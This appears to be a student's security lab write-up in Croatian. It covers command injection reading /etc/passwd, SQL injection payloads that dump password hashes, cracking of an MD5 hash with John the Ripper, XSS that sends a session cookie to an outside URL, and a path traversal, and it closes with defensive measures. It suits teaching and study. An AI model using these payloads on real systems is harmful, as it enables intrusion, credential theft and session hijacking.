@@ -1,0 +1,117 @@
+==================
+=== ZADATAK 1. ===
+==================
+
+1. Unesena naredba koja pokreće alat cat koji ispisuje datoteke:
+  1 | cat /etc/passwd
+
+2. Iskopiran vraćeni rezultat
+
+==> Sadržaj /etc/passwd
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/bin/false
+mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false
+
+
+==================
+=== ZADATAK 2. ===
+==================
+
+1. Unesen tekst: 
+  a' OR '1'='1
+
+Ovo stvara sql upit koji u WHERE dijelu ima tautologiju te vraća sve rezultate iz tablice.
+Traženi Pablo Picasso ima id 4.
+
+2. Zatim je unesen sljedeći tekst:
+  a' UNION SELECT CONCAT(first_name, ' ', last_name), password FROM users WHERE '1'='1
+
+Ovo stvara sql upit koji na prvo polje stavlja konkatenirano ime i prezime korisnika, a na drugo polje stavlja sažetak lozinke.
+Sada se može očitati traženi sažetak lozinke. 
+Traženi sažetak Pabla Picassa je 0d107d09f5bbe40cade3de5c71e9e9b7.
+
+Ova je vratilo sažetke svih korisnika, međutim budući da tražimo samo lozinku Pabla Picassa mogli smo 
+koristiti i izraz sličan sljedećem, ovo je moguće jer smo prethodno saznali id korisnika:
+  a' UNION SELECT CONCAT(first_name, ' ', last_name), password FROM users WHERE user_id = '4
+
+3. Ubacio sam sažetak u mrežni alat "crackstation.net" i kao rezultat dobio lozinku "letmein".
+
+(4.) Probao sam i alat John the Ripper, rezultat je ista očekivano ista lozinka, kod toga koraci su bili sljedeći:
+4.1 echo "0d107d09f5bbe40cade3de5c71e9e9b7" > "hashes.txt"
+4.2 cd ~srs/srs-lab/Lab3
+4.3 sudo john/run/john --show --format=raw-md5 ~/hashes.txt
+
+LOZINKA: letmein
+
+==================
+=== ZADATAK 3. ===
+==================
+
+XSS (Stored)
+
+1. Isprobavanje funkcionalnosti:
+  Unio sam  message. Iskoči alert, napad radi.
+
+2. U message sam unio  što je vratilo sljedeće:
+  PHPSESSID=7otm9g0v2tuoog7s416q9pcm93; security=low
+  
+Prema naputku slijedi vrijednost variable PHPSESSID u jednoj liniji:
+PHPSESSID=7otm9g0v2tuoog7s416q9pcm93; security=low
+
+3. Otvorio sam Inspector alat u Firefoxu te u HTML-u pronašao textarea element i promijenio maxlength na 500.
+
+4. U message sam stavio sljedeći javascript:
+  
+
+5. Skripta se izvršila i preusmjerila me stranicu gdje sam dobio 404 Not Found grešku. Link je bio sljedeći:
+  http://public.tel.fer.hr/srs?cookie=PHPSESSID=7otm9g0v2tuoog7s416q9pcm93;%20security=low
+
+XSS (Reflected)
+
+Iskoristio sam iste skripte kao i kod (Stored) pristupa.
+
+1. Unio sam  što je vratilo isti rezultat kao i prije:
+  PHPSESSID=7otm9g0v2tuoog7s416q9pcm93; security=low
+
+2. Unio sam 
+  što je opet rezultiralo istim kao i prije.
+
+Konačan URL kojim se krade kolačić je:
+  http://public.tel.fer.hr/srs?cookie=PHPSESSID=7otm9g0v2tuoog7s416q9pcm93;%20security=low
+
+
+==================
+=== ZADATAK 4. ===
+==================
+
+U linku sam promijenio query parametar name na sljedeći način:
+  ?page=/etc/passwd
+
+Ovo je rezultiralo "dumpanjem" datoteke na ekran kao što se vidi na priloženoj slici.
+
+Ovakva vrsta napada je moguća jer se ne provjerava što je korisnik unio, te se samo unosi u kod gdje se onda izvršava.
+
+Aplikaciju od ovakve vrste napada bih zaštitio implementacijom nekoliko zaštita:
+- za svaki URL bih dopustio pristup samo autentificiranim i autoriziranim korisnicima
+- koristio bi se princip najmanjih prava te bi se pojedinim ulogama/korisnicima davale dozvole, ostalo bi bilo zabranjeno
+- eliminirale bi se reference u URL-u
+- zamjena s privremenim vrijednostima koje se na poslužitelju preslikavaju u prave
+- provjeriti valjanost reference na objekt (provjera formata parametara, prava pristupa za korisnika, provjera pristupa objektu)
